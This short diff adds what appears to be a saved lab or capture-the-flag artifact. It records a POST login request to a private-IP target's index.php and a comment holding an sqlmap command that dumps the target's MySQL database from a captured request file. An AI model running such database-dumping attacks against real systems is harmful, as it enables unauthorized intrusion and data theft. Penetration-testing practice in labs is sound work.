@@ -1,0 +1,3 @@
+http://10.10.17.37:80/index.php (POST)  # /usr/bin/sqlmap -r auth_request.txt --dump --dbms=mysql --output-dir=.
+
+username=test&password=test&x=19&y=13
